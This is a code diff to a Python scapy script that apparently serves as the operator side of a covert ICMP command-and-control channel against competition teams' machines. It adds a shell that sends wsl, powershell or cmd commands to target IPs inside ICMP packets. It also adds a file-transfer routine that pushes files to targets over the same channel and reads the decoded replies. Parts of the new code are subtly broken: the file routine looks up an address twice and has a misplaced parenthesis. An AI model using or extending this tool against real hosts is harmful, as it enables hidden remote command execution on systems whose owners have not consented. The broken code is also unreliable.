@@ -7,6 +7,8 @@ teams = []
 cmdproc = [["l", "wsl"], ["p", "powershell"], ["c", "cmd"]]
 verbose = False
 
+iplook = lambda id : teams[int(id[0])-1][int(id[1])-1][1]
+
 def setup():
     # int(input("How many teams are competing?"))
     for i in range(15):
@@ -20,21 +22,21 @@ def setup():
             else:
                 teams[int(row[0]) - 1].append([row[1], row[2]])
     print(teams)
-    #shell()
+    shell()
 
 
 def sniffer():
-    pkts = sniff(filter="icmp", prn=resp_mgmt)
+    sniff(filter="icmp", prn=resp_mgmt)
     # These packets will come in periodically. The heartbeat will just have 1pkt that will have the str hb
 
 
 def resp_mgmt(pkt):
-    if str(pkt.getlayer(ICMP).type) == "echo-request":
+    if str(pkt.getlayer(ICMP).type) == "8":
         print("True")
     print(pkt.show())
     print(pkt.getlayer(ICMP).type)
     data = pkt.getlayer(ICMP).load.decode()
-    print(data)
+    print(data[1::])
 
 
 def shell():
@@ -50,7 +52,7 @@ def shell():
         elif cmd == "lookup":
             lookup = input("What information to pull:")
             try:
-                print(teams[int(lookup[0]) - 1][int(lookup[1]) - 1])
+                print(iplook(lookup))
             except IndexError:
                 print("Out of bounds")
             except ValueError:
@@ -59,14 +61,17 @@ def shell():
             send = []
             send.append(input("CMD Processor:"))
             send.append(input("Command:"))
-            target = input("Target:")  # this is going to use the numbering system that is already in use for organization of the teams and their boxes
+            id = input("Target:")  # this is going to use the numbering system that is already in use for organization of the teams and their boxes
             msg = ' '.join(send)
-            rpckt = sr1(IP(dst=teams[int(target[0])-1][int(target[1])-1][1])/ICMP()/msg)
+            rpckt = sr1(IP(dst=iplook(id))/ICMP()/msg)
             if verbose:
                 print(f'Send list:{send}')
                 print(f'Msg:{msg}')
-                print(f'Target IP:{teams[int(target[0]) - 1][int(target[1]) - 1][1]}')
+                print(f'Target IP:{iplook(id)}')
                 print(f'Return Packet:\n {rpckt.show()}')
+        elif cmd == "file":
+            id = input("Target: ")
+            file_transfer(input("What File would you like to send:"), iplook(id))
         else:
             print("Invalid command")
 
@@ -75,22 +80,30 @@ def heartbeat():#Using this because ping has aknowledgement already
     print("THIS IS BEAT")
 
 
+def file_transfer(file, id):#can maybe add a speed system to control when stuff gets sent
+    with open(file, "rb") as myfile:
+        data = myfile.read()
+        print(data)
+        send(IP(dst=iplook(id))/ICMP()/f'f1{file}')
+        time.sleep(1)
+        send(IP(dst=iplook(id)/ICMP()/f'f2{data}'))
+
+
 def main():
     global verbose
     try:
         if sys.argv[1] == "-v":
             verbose = True
     finally:
-        """
+
         t1 = threading.Thread(target=setup)
         t2 = threading.Thread(target=sniffer)
         t1.start()
         t2.start()
         t1.join()
         t2.join()
-        """
-        setup()
-        shell()
+        #setup()
+        #shell()
 
 
 main()
